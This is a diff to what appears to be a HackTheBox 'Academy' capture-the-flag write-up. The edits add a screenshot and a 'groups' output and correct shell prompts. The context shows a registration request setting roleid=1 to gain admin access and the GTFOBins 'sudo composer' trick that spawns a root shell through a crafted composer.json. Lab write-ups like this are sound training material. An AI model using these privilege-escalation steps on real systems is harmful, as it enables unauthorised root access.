@@ -135,6 +135,8 @@ uid=admin_test&password=Test123&confirm=Test123&roleid=1
 
 ![Burp Suite - POST Register 2](./assets/screenshots/hackthebox_academy_burpsuite_post_register_2.png)
 
+![Firefox - Login Page](./assets/screenshots/hackthebox_academy_firefox_login_page.png)
+
 ![Firefox - Admin Page](./assets/screenshots/hackthebox_academy_firefox_admin_page.png)
 
 ```
@@ -353,6 +355,12 @@ cry0l1t3@academy:~$ cat /home/cry0l1t3/user.txt
 c91ea*************************** 🚩
 ```
 
+```
+cry0l1t3@academy:~$ groups
+
+cry0l1t3 adm
+```
+
 ****
 
 ```
@@ -404,7 +412,7 @@ mrb3n@academy:~$
 **Linux Privilege Escalation**
 
 ```
-cry0l1t3@academy:~$ sudo -l
+mrb3n@academy:~$ sudo -l
 
 [SNIP]
 
@@ -482,7 +490,7 @@ $application->run();
 ![Firefox - GTFOBins - `composer` - `sudo`](./assets/screenshots/hackthebox_academy_firefox_gtfobins_composer_sudo.png)
 
 ```
-TF=$(mktemp -d)
+mrb3n@academy:~$ TF=$(mktemp -d)
 echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
 sudo composer --working-dir=$TF run-script x
 
